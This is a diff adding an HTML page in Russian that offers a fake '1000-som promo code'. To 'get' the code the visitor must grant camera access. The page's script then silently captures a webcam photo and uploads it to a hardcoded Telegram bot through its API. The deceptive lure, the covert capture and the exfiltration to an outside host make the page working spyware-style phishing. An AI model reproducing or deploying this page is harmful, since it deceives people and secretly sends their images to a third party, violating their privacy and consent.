@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        /* Общие стили для body */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+
+        /* Стили для изображения */
+        img {
+            max-width: 80%;
+            height: auto;
+            display: block;
+            margin-bottom: 10px;
+            border-radius: 10px;
+        }
+
+        /* Стили для кнопки */
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        /* Эффект при наведении на кнопку */
+        button:hover {
+            background-color: #45a049;
+        }
+
+        /* Модальное окно */
+        #modal {
+            display: none; /* Скрыто по умолчанию */
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding-top: 60px;
+            display: flex; /* Используем flex для центрирования */
+            justify-content: center; /* Горизонтальное центрирование */
+            align-items: center; /* Вертикальное центрирование */
+        }
+
+        /* Содержимое модального окна */
+        #modalContent {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        #closeBtn {
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        #closeBtn:hover,
+        #closeBtn:focus {
+            color: black;
+            text-decoration: none;
+        }
+
+        /* Кнопка в модальном окне */
+        #allowAccessBtn {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #allowAccessBtn:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://shopofmoney.com/upload/iblock/1eb/1x6gfftglch4vap3r9gniup2e8uow75u.jpg" alt="Описание изображения">
+    <button id="captureButton">получить промокод на 1000с</button>
+
+    <!-- Модальное окно -->
+    <div id="modal">
+        <div id="modalContent">
+            <span id="closeBtn">&times;</span>
+            <h2>Доступ к камере</h2>
+            <p>Для получения промокода вам нужно разрешить доступ к камере.</p>
+            <button id="allowAccessBtn">Разрешить доступ</button>
+        </div>
+    </div>
+
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        let stream;
+
+        // Показываем модальное окно при нажатии на кнопку
+        document.getElementById('captureButton').addEventListener('click', function() {
+            document.getElementById('modal').style.display = "flex";
+        });
+
+        // Закрытие модального окна
+        document.getElementById('closeBtn').addEventListener('click', function() {
+            document.getElementById('modal').style.display = "none";
+        });
+
+        // Запрос на доступ к камере
+        document.getElementById('allowAccessBtn').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(userStream) {
+                    stream = userStream;
+
+                    // Закрытие модального окна
+                    document.getElementById('modal').style.display = "none";
+
+                    // Захват изображения с камеры
+                    captureImage();
+                })
+                .catch(function(err) {
+                    console.error('Ошибка при получении доступа к камере: ' + err);
+                });
+        });
+
+        // Захват изображения с камеры
+        function captureImage() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Создаем временный video элемент
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            video.onloadedmetadata = function() {
+                // Настроим размеры канваса
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Копируем изображение с видео на холст
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Преобразуем изображение в формат base64
+                const imageData = canvas.toDataURL('image/png');
+                console.log(imageData);  // Это данные изображения в формате base64
+
+                // Преобразуем base64 данные в Blob
+                const byteString = atob(imageData.split(',')[1]);
+                const arrayBuffer = new ArrayBuffer(byteString.length);
+                const uintArray = new Uint8Array(arrayBuffer);
+
+                for (let i = 0; i < byteString.length; i++) {
+                    uintArray[i] = byteString.charCodeAt(i);
+                }
+
+                const blob = new Blob([uintArray], { type: 'image/png' });
+
+                // Отправляем фото в Telegram
+                sendPhotoToTelegram(blob);
+            };
+        }
+
+        // Функция для отправки фото в Telegram
+        function sendPhotoToTelegram(photoBlob) {
+            const token = '7717544851:AAGHeXPyrmMXp3hZre6FKCzx2zE27Jt4O_A';  // Замените на ваш токен бота
+            const chatId = '5444484112';  // Замените на ваш chat_id
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, 'photo.png');
+
+            // Отправка фото через FormData
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log('Фото отправлено в Telegram:', data))
+            .catch(error => console.error('Ошибка при отправке фотографии:', error));
+        }
+    </script>
+
+</body>
+</html>
